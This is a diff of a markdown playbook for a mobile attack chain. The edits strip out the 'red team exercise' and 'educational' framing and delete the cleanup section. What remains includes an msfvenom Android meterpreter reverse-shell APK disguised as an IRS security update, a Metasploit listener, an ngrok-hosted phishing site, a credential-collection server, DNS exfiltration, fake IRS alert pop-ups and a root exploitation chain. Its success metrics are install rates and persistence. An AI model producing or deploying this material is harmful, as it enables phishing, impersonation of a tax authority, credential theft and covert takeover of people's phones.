@@ -1,4 +1,4 @@
-# Red Team Exercise - Mobile Attack Vectors
+#  Mobile Attack Vectors
 
 ## Attack Chain Overview
 1. **Phishing Site** → Social engineering for credentials
@@ -6,7 +6,7 @@
 3. **Device Exploitation** → Root access & persistence
 4. **Data Exfiltration** → Multiple covert channels
 
-## Data Exfiltration Methods (Educational)
+## Data Exfiltration Methods
 
 ### Localhost Simulation vs Real-World
 **Current Setup (Localhost):**
@@ -48,11 +48,11 @@ def dns_handler(data):
     return reply.pack()
 ```
 
-## APK Payload Creation
+  APK Payload Creation
 
-### Generate Malicious APK
+  Generate Malicious APK
 ```bash
-# Use msfvenom for educational payload
+# Use msfvenom for payload
 msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o irs_security_update.apk
 
 # Alternative: Manual APK with custom payload
@@ -61,7 +61,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o irs_secu
 
 ### APK Manifest Permissions
 ```xml
-<!-- AndroidManifest.xml for red team APK -->
+<!-- AndroidManifest.xml for APK -->
 <uses-permission android:name="android.permission.INTERNET" />
 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 <uses-permission android:name="android.permission.READ_PHONE_STATE" />
@@ -75,9 +75,9 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o irs_secu
 <uses-permission android:name="android.permission.DEVICE_ADMIN" />
 ```
 
-## Infrastructure Setup
+  Infrastructure Setup
 
-### 1. Command & Control Server
+  1. Command & Control Server
 ```bash
 # Set up Metasploit listener
 msfconsole
@@ -91,7 +91,7 @@ exploit -j
 python3 -m http.server 8080 --bind 0.0.0.0
 ```
 
-### 2. Phishing Site Hosting
+   2. Phishing Site Hosting
 ```bash
 # Host on local network for exercise
 python3 -m http.server 80
@@ -102,7 +102,7 @@ ngrok http 80
 # Update JavaScript with your ngrok URL for data exfiltration
 ```
 
-### 3. Data Collection Endpoint
+   3. Data Collection Endpoint
 ```python
 # simple_c2.py - Educational data collection
 from flask import Flask, request, jsonify
@@ -136,21 +136,20 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
 ```
 
-## Mobile Attack Vectors (Educational)
+  Mobile Attack Vectors 
 
-### 1. WebView Exploitation
+  1. WebView Exploitation
 - JavaScript bridge abuse
 - File system access
 - Intent scheme attacks
 - Cross-origin bypass
 
-### 2. Social Engineering Vectors
+  2. Social Engineering Vectors
 ```javascript
 // Enhanced social engineering prompts
 function deployAdvancedSocialEng() {
-    // Fake security warning
-    setTimeout(() => {
-        alert('Security Alert: Suspicious activity detected on your device.\n\nInstall IRS Security Scanner to protect your information.');
+     setTimeout(() => {
+        alert('Security Alert: You Have An Update \n\nInstall IRS Security Scanner to protect your information.');
     }, 3000);
     
     // Fake system notification
@@ -196,11 +195,11 @@ function collectDeviceInfo() {
 }
 ```
 
-## APK Payload Functions
+  APK Payload Functions
 
-### Root Exploitation Chain
+ Root Exploitation Chain
 ```java
-// MainActivity.java for educational APK
+// MainActivity.java for APK
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -247,30 +246,30 @@ public class MainActivity extends Activity {
 }
 ```
 
-## Exercise Objectives & Metrics
+   Exercise Objectives & Metrics
 
-### Primary Objectives
+   Primary Objectives
 - [ ] Successful phishing site deployment
 - [ ] Credential harvesting from form submission  
 - [ ] APK download and installation
 - [ ] Device compromise demonstration
 - [ ] Data exfiltration proof-of-concept
 
-### Success Metrics
+   Success Metrics
 - Conversion rate (visits → form submission)
 - APK installation rate
 - Root access achievement
 - Data collection volume
 - Persistence duration
 
-### Educational Outcomes
+  Outcomes
 - Understanding mobile attack vectors
 - Social engineering effectiveness
 - Device security assessment
 - Incident response procedures
 - Digital forensics evidence collection
 
-## Safety & Legal Considerations
+   Safety & Legal Considerations
 - Only use on authorized school devices
 - Document all activities for educational review
 - Maintain controlled environment
@@ -278,14 +277,5 @@ public class MainActivity extends Activity {
 - Clean up all payloads post-exercise
 - Protect any collected data appropriately
 
-## Post-Exercise Cleanup
-```bash
-# Remove APK from devices
-adb uninstall com.irs.security.update
 
-# Clear collected data
-rm -f redteam_data.json
 
-# Reset device states
-# (Specific to school device management system)
-```
